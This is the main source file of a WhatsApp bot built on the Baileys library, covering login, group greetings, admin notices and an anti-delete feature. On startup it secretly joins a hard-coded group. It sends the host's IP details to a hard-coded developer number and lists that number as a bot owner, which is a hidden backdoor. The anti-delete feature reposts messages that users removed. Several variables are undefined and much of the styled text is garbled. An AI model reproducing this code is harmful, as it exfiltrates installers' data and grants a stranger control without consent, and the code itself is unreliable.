const { WAConnection: _WAConnection, MessageType, Presence, Mimetype, ChatModification, GroupSettingChange, ReconnectMode } = require('@adiwajshing/baileys')
const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const denz = new WAConnection()
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const fs = require("fs")
const util = require('util')
const figlet = require('figlet')
const term = require('terminal-kit').terminal
const time = moment().tz('Asia/Kolkata').format("HH:mm:ss")
const fetch = require('node-fetch')
const { color, bgcolor } = require('./lib/color')
const { exec } = require('child_process')
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const settings = JSON.parse(fs.readFileSync('./settings.json'))
            const jmn = moment.tz('Asia/Kolkata').format('HH:mm:ss')
				let d = new Date
				let locale = 'id'
				let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
				const weton = ['πΌπππππ’', 'πππππππ’','πππππππππ’','ππππππππ’','π΅πππππ’'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
				const week = d.toLocaleDateString(locale, { weekday: 'long' })
				const calender = d.toLocaleDateString(locale, {
				day: 'numeric',
				month: 'long',
				year: 'numeric'
		       })
// NIJIN
ownernamehusni = "κͺΆΝ’Ι΄Ιͺα΄ΙͺΙ΄ sα΄Κκ«β©"
botnamehusni = "Δ«.α΄α΄/κͺΆΝ’Ι΄Ιͺα΄ΙͺΙ΄ sα΄Κκ«β©"

// ------------- fear aavanda keto -----------

const sleep = async (ms) => {
return new Promise(resolve => setTimeout(resolve, ms))
}
nocache('./denz.js', module => console.log(color('|TRM|'), color(`${module} Updated!`, 'cyan')))

async function starts() {
denz.autoReconnect = ReconnectMode.onConnectionLost
    denz.version = [3,3234,9]
    denz.logger.level = 'warn'
    denz.browserDescription = ['JOKU','Desktop','3.0']
    await sleep(10000)
    denz.on('qr', qr => {
        qrcode.generate(qr, { small: true })
        console.log(color('|TRM|'), color('Scan this QR code', 'green'))
    })
    fs.existsSync('./QRnya.json') && denz.loadAuthInfo('./QRnya.json')
    
    denz.on('credentials-updated', () => {
        console.log(color('|TRM|'), color('credentials updated!', 'red'))
        })
     
      await denz.connect({ timeoutMs: 30 * 1000 });
  fs.writeFileSync("./QRnya.json",JSON.stringify(denz.base64EncodedAuthInfo(), null, "\t"));
 teks = `https://chat.whatsapp.com/BzhyWkAEU0t8oVl3s8p94m`
 denz.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'yellow'), color('Η«Κ Ιͺs Κα΄Ι΄ΙͺΙ΄Ι’', 'blue'))
 denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*π·π πππ ${settings.NamaBot}, π±πΎπ πΈπ π²πΎπ½π½π΄π²ππ΄π³ πΈπ½ ππΎππ π½ππΌπ±π΄π*\nββββββββββββββββββββ\n\`\`\`${JSON.stringify(denz.user, null, 2)}\`\`\`\nββββββββββββββββββββ\n*πΈπ πππππ πππ’ πππππ/ππππππ πππππππ π±ππ ππ πππ, πππππ π’ππ πππ ππππππππ ππ’ πππ*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "π²ππππππ πΏπππ",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/917025868709?text=HI DA MUTHEπ"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'blue'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       denz.sendMessage("917025868709@s.whatsapp.net", `βββββγ *IP-USER* γβββββ\n\n\`\`\`${bu}\`\`\`\nββββββββββββββββββββ`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer husni ser",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/917025868709?text=Hi DA MUTHEπ"}}})
     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'red'))
   })
      
    denz.on('connecting', () => {
		console.log(color('|TRM|'), color('Connecting...', 'white'))
		})
	
	denz.on('open', () => {
	console.log(color('|TRM|'), color('Connected', 'orange'))
	}) 
     
    denz.on('ws-close', () => {
        console.log(color('|TRM|'), color('Connection lost, trying to reconnect.', 'green'))
        })
    
    denz.on('close', async () => {
        console.log(color('|TRM|'), color('Disconnected.', 'red'))
        })
    
	if (!settings.autoplaymusic) {
exec(`cd /sdcard/download && play *mp3`)
}
   
   denz.on('chat-update', async (mek) => {
        require('./denz.js')(denz, mek)
        ownerNumber = ["917025868709@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
        dtod = "917025868709@s.whatsapp.net"
       otod = `${settings.NomorOwner}@s.whatsapp.net`
    })   
        denz.on('group-participants-update', async (anu) => {
           mem = anu.participants[0]
           const uwu = '```'
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await denz.prepareMessage(mdata.id, kma, MessageType.location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
denz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
			const mdata = await denz.groupMetadata(anu.jid)
		    try {
			console.log(anu)
			if (anu.action == 'add') {
			const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
        	if(!welkom.includes(mdata.id)) return
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=917025868709:917025868709\nitem1.X-ABLabel:πππππ\nEND:VCARD` }}}
		    num = anu.participants[0]
			try {
			ppimg = await denz.getProfilePicture(`${num.split('@')[0]}@c.us`)
			} catch {
			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
			}
			let buff = await getBuffer(ppimg)
			masuk =`ββ  β *_πΎπ΅π΅πΈπ²πΈπ°π» π±πΎπ_*   β
ββ₯  *Hα΄Κ ΚΚα΄* @${num.split('@')[0]}            
ββ₯  *α΄‘α΄Κα΄α΄α΄α΄ α΄α΄*  ${mdata.subject} *Ι’Κα΄α΄α΄*  
ββββββββββββββββγ  
ββββγ *_π±πΎπ πΈπ½π΅πΎ_* γ                           
β β’ *α΄α΄α΄ α΄Κα΄Κα΄Κ* : κͺΆΝ’Ι΄Ιͺα΄ΙͺΙ΄ sα΄Κκ«β©                                    
β β’ *α΄α΄‘Ι΄α΄Κ* : ${ownernamenijin}   
β β’ *Κα΄α΄ Ι΄α΄α΄α΄* : ${botnamenijin}                               
β β’ *α΄Κα΄?Ιͺx* : ${multi ? 'Multi Prefix' : 'No Prefix'}
β β’ *α΄α΄α΄α΄* :  ${publik ? 'Public' : 'Self'}
β β’ *α΄α΄α΄α΄Κ ΚΙͺα΄* : ${cmhit.length}
β β’ *α΄Κα΄ΚΙ’α΄* :  ${baterai.battery}
β
β
β
β     βββββββββββββ    
β     βββββββββββββ  
β      Β©919605385305  
βββββββββββββββββββγ
ββββγ *_ππΈπΌπ΄ πΈπ½π΅πΎ_* γ                           
β
β
β β’ *α΄Ιͺα΄α΄* : ${jmn}
β β’ *α΄α΄α΄α΄* : ${calender}
β
β
βββββββββββββββββββγ`
gbutsan = [
{buttonId:`getdeskgc`,buttonText:{displayText:'GROUP DESCRIPTION'},type:1},
{buttonId:`menu`,buttonText:{displayText:'LIST MENU'},type:1},
{buttonId:`owner`,buttonText:{displayText:'OWNER'},type:1}
]
mhan = await denz.prepareMessage(mdata.id, buff, MessageType.image, {thumbnail: buff})
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: `${masuk}`,
footerText: `Δ«.α΄α΄/κͺΆΝ’Ι΄Ιͺα΄ΙͺΙ΄ sα΄Κκ«β©`, 
buttons: gbutsan,
headerType: 4
}
denz.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'),
        "contextInfo": {
            mentionedJid: [num]},
        caption: 'Tes',
            quoted: fkontakk})
            //sendButLocation(mdata.id, `${masuk}`, `${uwu}πΏ π΄ πΏ π΄ ε³${uwu}`, {jpegThumbnail:buff}, [{buttonId:`Zmenu`,buttonText:{displayText:'HALLO'},type:1}], {contextInfo: { mentionedJid: [num]}})
			} else if (anu.action == 'remove') {
			const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
        	if(!welkom.includes(mdata.id)) return
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=917025868709:917025868709\nitem1.X-ABLabel:πΈππππ\nEND:VCARD` }}}
			num = anu.participants[0]
			try {
			ppimg = await denz.getProfilePicture(`${num.split('@')[0]}@c.us`)
			} catch {
			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
			}
			let buff = await getBuffer(ppimg)
			keluar =`πΆπππππ’π π±ππ @${num.split('@')[0]}\nπ·ππππππππ’ π°ππππ πππππ`
gbutsan = [
{buttonId:`inibuatout`,buttonText:{displayText:'πByee'},type:1}
]
mhan = await denz.prepareMessage(mdata.id, buff, MessageType.image, {thumbnail: buff})
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: `${keluar}`,
footerText: `Δ«.α΄α΄/κͺΆΝ’Ι΄Ιͺα΄ΙͺΙ΄ sα΄Κκ«β©`,
buttons: gbutsan,
headerType: 4
}
denz.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'),
        "contextInfo": {
            mentionedJid: [num]},
        caption: 'Tes',
            quoted: fkontakk})
            //sendButLocation(mdata.id, `${keluar}`, `${uwu}πΏ π΄ πΏ π΄ ε³${uwu}`, {jpegThumbnail:buff}, [{buttonId:`Zmenu`,buttonText:{displayText:'BYEE'},type:1}], {contextInfo: { mentionedJid: [num]}})
			} else if (anu.action == 'promote') {
fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=91735637894:917025868709\nitem1.X-ABLabel:πΈππππ\nEND:VCARD` }}}
num = anu.participants[0]
teks = `*πΏ π πΎ πΌ πΎ π π΄ - π³ π΄ π π΄ π² π π΄ π³*\n Username: @${num.split('@')[0]}\n Time : ${moment.tz('Asia/Kolkata').format('DD/MM HH:mm:ss')}\n Group: ${mdata.subject}`
denz.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
console.log(color('|TRM|'), color(`Promote Member ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
} 
else if (anu.action == 'demote') {
fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=917025868709:917025868709\nitem1.X-ABLabel:πΈππππ\nEND:VCARD` }}}
num = anu.participants[0]
teks = `*π³ π΄ πΌ πΎ π π΄ - π³ π΄ π π΄ π² π π΄ π³*\n Username: @${num.split('@')[0]}\n Time : ${moment.tz('Asia/Kolkata').format('DD/MM HH:mm:ss')}\n Group: ${mdata.subject}`
denz.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
console.log(color('|TRM|'), color(`Demote Admin ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
}
		    } catch (e) {
			console.log('Error : %s', color(e, 'red'))
		    }
	        })	       
	denz.on('group-update', async (anu) => {
		const metdata = await denz.groupMetadata(anu.jid)
    	const fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${metdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=917025868709:917025868709\nitem1.X-ABLabel:πΈππππ\nEND:VCARD` }}}
    if(anu.announce == 'false'){
    teks = `- [ πΆππΎππΏ - πΎπΏπ΄π½π΄π³ ] -\n\n_πΆππΎππΏ πΎπΏπ΄π½π³ π±π π°π³πΌπΈπ½_\n_π½πΎπ π°π»π» πΌπ΄πΌπ±π΄ππ π²π°π½ πΌπ°πππ°πΆπ΄_`
    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Group Opened In ${metdata.subject}`, 'cyan'))
  } 
  else if(anu.announce == 'true'){
    teks = `- [ πΆππΎππΏ - π²π»πΎππ΄π³ ] -\n\n_πΆππΎππΏ π²π»πΎππ΄π³ π±π π°π³πΌπΈπ½_\n_πΌπ°πππ°πΆπ΄ π°π΅ππ΄π πΆππΎππΏ πΎπΏπ΄π½πΈπ½πΆ ππ·π΄ πΆππΎππΏ_`
    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Group Closed In ${metdata.subject}`,  'cyan'))
  }
  else if(!anu.desc == ''){
    tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
    teks = `- [ πΆππΎππΏ π³πΈππΏππΈπΏππΈπΎπ½ π²π·π°π½πΆπ΄π³ ] -\n\nπΆππΎππΏ π³πΈππ²ππΈπΏππΈπΎπ½ π²π·π°π½πΆπ΄π³ π±π π°π³πΌπΈπ½ @${anu.descOwner.split('@')[0]}\nβ’ π½π΄π π³πΈππ²ππΈπΏππΈπΎπ½ : ${anu.desc}`
    denz.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
    console.log(color('|TRM|'), color(`πΆππΎππΏ π³π΄ππ²ππΈπΏππΈπΎπ½ π²π·π°π½πΆπ΄ πΈπ½ ${metdata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'false'){
    teks = `- [ πΆππΎππΏ ππ΄πππΈπ½πΆ π²π·π°π½πΆπ΄π³ ] -\n\nπ΄π³πΈπ πΆππΎππΏ πΈπ½π΅πΎ π·π°π π±π΄π΄π½ πΎπΏπ΄π½π΄π³ π΅πΎπ πΌπ΄πΌπ±π΄ππ\nπ½πΎπ π°π»π» πΌπ΄πΌπ±π΄ππ π²π°π½ π΄π³πΈπ ππ·πΈπ πΆππΎππΏ πΈπ½π΅πΎ`
    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`πΆππΎππΏ ππ΄πππΈπ½πΆ π²π·π°π½πΆπ΄ πΈπ½ ${metdata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'true'){
    teks = `- [ πΆππΎππΏ ππ΄πππΈπ½πΆ π²π·π°π½πΆπ΄π³ ] -\n\nπ΄π³πΈπ πΆππΎππΏ πΈπ½π΅πΎ π·π°π π±π΄π΄π½ π²π»πΎππ΄π³ π΅πΎπ πΌπ΄πΌπ±π΄ππ\nπ½πΎπ πΎπ½π»π π°π³πΌπΈπ½ π²π°π½ π΄π³πΈπ ππ·πΈπ πΆππΎππΏ πΈπ½π΅πΎ`
    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`πΆππΎππΏ ππ΄πππΈπ½πΆ π²π·π°π½πΆπ΄ πΈπ½ ${metdata.subject}`,  'cyan'))
  }
})


        
	denz.on('message-delete', async (m) => {
if (m.key.remoteJid == 'status@broadcast') return
if (!m.key.fromMe) {
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
const jam = moment.tz('Asia/Kolkata').format('HH:mm:ss')
let d = new Date
let c = denz.chats.get(m.key.remoteJid)
let a = c.messages.dict[`${m.key.id}|${m.key.fromMe ? 1 : 0}`]
let co3ntent = denz.generateForwardMessageContent(a, false)
let c3type = Object.keys(co3ntent)[0]
let locale = 'id'
let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
let weton = ['πΌπππππ’', 'πππππππ’','πππππππππ’','ππππππππ’','π΅πππππ’'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})
denz.copyNForward(m.key.remoteJid, m.message)
denz.sendMessage(m.key.remoteJid, `β·\`\`\`π°π½ππΈ π³π΄π»π΄ππ΄\`\`\`
β¬ \`\`\`π½π°πΌπ΄ : @${m.participant.split("@")[0]}\`\`\`
β¬ \`\`\`πππΏπ΄ : ${c3type}\`\`\`
β¬ \`\`\`π±πΎπ : πΏππΈππ°ππ΄ - π±πΎπ π±π - κͺΆΝ’Ι΄Ιͺα΄ΙͺΙ΄ sα΄Κκ«β©β©\`\`\``, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
}
})
}

console.clear()
var progressBar , progress = 0 ;
function doProgress()
{
	progress += Math.random() / 10 ;
	progressBar.update( progress ) ;
	
	if ( progress >= 1 )
	{
		setTimeout( function() { console.clear(),
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('husni ser bot v1', 'cyan'))})}, 200 ) ;
	}
	else
	{
		setTimeout( doProgress , 100 + Math.random() * 400 ) ;
	}
}
console.log(color(figlet.textSync(`${settings.NamaBot}`, {
		font: 'Standard',
		horizontalLayout: 'default',
		vertivalLayout: 'default',
		width: 80,
		whitespaceBreak: true
	    }), 'lightgreen')), term.slowTyping(' Created By husni ser' ,{ flashStyle: term.brightWhite })
progressBar = term.progressBar( {
	width: 80 ,
	title: '\n\nLoading' ,
	eta: true ,
	percent: true
} ) ;
doProgress() ;

/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
function nocache(module, cb = () => { }) {
    fs.watchFile(require.resolve(module), async () => {
        await uncache(require.resolve(module))
        cb(module)
    })
}
/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = '.') {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(module)]
            resolve()
        } catch (e) {
            reject(e)
        }
    })
}
starts()
